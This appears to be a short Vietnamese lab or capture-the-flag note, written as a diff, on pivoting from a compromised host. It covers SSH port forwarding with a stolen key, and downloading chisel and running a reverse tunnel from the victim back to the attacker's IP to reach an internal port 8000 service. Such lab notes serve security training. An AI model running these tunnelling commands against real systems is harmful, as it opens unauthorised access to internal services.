@@ -1,0 +1,21 @@
+Sử dụng SSH để forwarding port -> máy tấn công:
+ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105
+
+Sử dụng chisel để tạo kết nối client-server sau đó forwarding port -> máy server:
+Download chisel về máy attacker:
+curl https://i.jpillora.com/chisel! -o chisel
+Gán quyền thực thi -> chisel
+chmod +x chisel
+Cài đặt chisel lên máy attacker.
+bash chisel
+Copy file chishel đã được cài -> file transfer -> máy victim:
+cp /usr/local/bin/chisel .
+sau đó chuyển file chisel này lên máy victim
+Câu lệnh thực thi tạo phiên kết nối và reverse port forwarding:
+
+Trên máy attacker, ta chạy lệnh sau:
+chisel server -p 8001 --reverse
+Trên máy victim, ta chạy lệnh sau:
+./chisel client 10.10.14.59:8001 R:8000:127.0.0.1:8000
+
+Kiểm tra kết quả bằng cách mở trình duyệt -> truy cập vào http://localhost:8000
